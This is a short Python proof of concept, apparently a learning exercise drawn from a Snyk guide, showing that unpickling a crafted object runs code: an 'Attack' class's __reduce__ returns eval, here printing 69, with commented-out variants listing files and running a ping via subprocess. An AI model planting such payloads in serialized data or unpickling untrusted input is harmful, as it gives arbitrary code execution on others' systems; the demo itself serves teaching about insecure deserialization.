# https://snyk.io/blog/guide-to-python-pickle/

import pickle


class Attack:
    def __reduce__(self):
        # return eval, ("print(__import__('os').listdir('.'))",)
        # return eval, ("print(__import__('subprocess').check_output('ping -n 1 ya.ru'))",)
        return eval, ("print(69)",)


if __name__ == '__main__':
    assert 69 == pickle.loads(pickle.dumps(69))
    pickle.loads(pickle.dumps(Attack()))
